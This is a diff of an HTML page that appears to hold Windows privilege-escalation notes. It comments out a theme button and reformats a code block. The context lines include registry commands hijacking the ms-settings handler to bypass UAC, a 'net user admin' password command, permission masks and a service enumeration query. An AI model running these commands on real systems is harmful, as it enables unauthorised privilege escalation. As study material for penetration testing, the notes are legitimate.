@@ -64,11 +64,11 @@
 
             <div class="nav__btns">
                 <!--Theme change button-->
-                <i class="uil uil-moon change-theme" id="theme-button"></i>
+                <!-- <i class="uil uil-moon change-theme" id="theme-button"></i>
 
                 <div class="nav__toggle" id="nav-toggle">
                     <i class="uil uil-apps"></i>
-                </div>
+                </div> -->
             </div>
         </nav>
     </header>
@@ -86,8 +86,7 @@ Start-Process -NoNewWindow -FilePath C:/File.exe</code></pre><p id="a90860ba-0a3
 REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
 REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
 REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d &quot;cmd.exe&quot; /f
-net user admin password123!
-</code></pre><p id="7b0b5183-e5d0-4040-ab40-3b408eedcc2a" class="">
+net user admin password123!</code></pre><p id="7b0b5183-e5d0-4040-ab40-3b408eedcc2a" class="">
 </p><p id="c60da5d3-928f-4cf6-ba49-f4b8d9570781" class=""><strong>Insecure File Permissions:</strong></p><p id="b28e1ae0-8c30-4667-ab62-f0ede49c20e3" class="">
 </p><table id="77f2892f-b7e0-402a-b987-bdc648005293" class="simple-table"><tbody><tr id="2a66b15c-43a6-4ca9-a96c-0131c024a49f"><td id="IU}o" class="">Mask</td><td id="loe|" class="">Permissions</td></tr><tr id="dce4e9e4-ea9e-4ee7-92d9-4fc3ca6a840b"><td id="IU}o" class="">F</td><td id="loe|" class="">Full access</td></tr><tr id="c3c86bd6-1714-49df-8ade-23dcab4e0e90"><td id="IU}o" class="">M</td><td id="loe|" class="">Modify access</td></tr><tr id="1781eb3a-ae33-48a1-9153-c4299350605a"><td id="IU}o" class="">RX</td><td id="loe|" class="">Read and execute access</td></tr><tr id="30ca2de4-6a81-49f3-a6dc-bf0a87fd4a53"><td id="IU}o" class="">R</td><td id="loe|" class="">Read-only access</td></tr><tr id="5d406deb-008b-424c-a2e9-3a335ae17c14"><td id="IU}o" class="">W</td><td id="loe|" class="">Write-only access</td></tr></tbody></table><h3 id="0acaa968-9b53-4227-b4a9-55891c2de03d" class="">Identifying a running service:</h3><pre id="4c83fd07-f249-4b79-9feb-cab0be14ed36" class="code"><code>PS&gt; Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like &#x27;Running&#x27;}
 #service running is returned...
